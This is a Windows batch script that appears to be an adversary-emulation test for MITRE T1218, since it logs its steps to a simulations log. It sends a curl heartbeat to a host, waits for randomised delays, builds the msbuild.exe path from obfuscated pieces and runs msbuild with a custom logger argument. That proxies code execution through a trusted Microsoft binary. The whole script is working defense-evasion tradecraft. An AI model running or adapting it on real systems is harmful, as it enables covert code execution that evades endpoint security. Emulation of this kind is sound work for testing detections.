@echo off
SETLOCAL EnableDelayedExpansion
SET txisnba=%APPDATA%\8753\c7a6787d
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8753-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=visio.txt
SET dvhhyc=8753
SET wklbhqm=%APPDATA%\!rrocubc!\macula-simulations.log
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start>> "!wklbhqm!" 2>nul

REM Initial delay
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete>> "!wklbhqm!" 2>nul

REM Heartbeat
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_sent>> "!wklbhqm!" 2>nul
ping -n 8 127.0.0.1 >nul

REM Build obfuscated msbuild path
SET vbnmkj=SystemRoot
SET qazwsx=Microsoft.NET
SET edcrfv=Framework
SET tgbzhn=v4.0.30319
SET yhnujm=msbuild.exe
SET part1=!
SET part2=!vbnmkj!
SET part3=!\!qazwsx!\!edcrfv!\!tgbzhn!\!yhnujm!
CALL SET msbuildpath=%%part2%%%%part3%%
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: path_built=!msbuildpath!>> "!wklbhqm!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul

REM Build logger argument
SET arg1=/logger:LoggerEntry
SET arg2=,!
SET arg3=!txisnba!\!xzanpex!
SET arg4=;MyParameters,Foo
CALL SET loggerarg=%%arg1%%%%arg2%%%%arg3%%%%arg4%%
SET /A rdelay=!RANDOM! %% 20 + 10
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: args_built>> "!wklbhqm!" 2>nul

REM Execute
SET result=0
SET errdetail=
"!msbuildpath!" !loggerarg! >nul 2>&1
IF !ERRORLEVEL! EQU 0 (SET result=1) ELSE (SET errdetail=msbuild_failed_!ERRORLEVEL!)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: execution_complete=!result!>> "!wklbhqm!" 2>nul
SET ttpdt=!rrocubc!-!dvhhyc!-T1218|MSBuild=!result!:!errdetail!
echo [!DATE! !TIME!][!jwcnifl!]: !ttpdt!>> "!wklbhqm!" 2>nul
ping -n 6 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_end>> "!wklbhqm!" 2>nul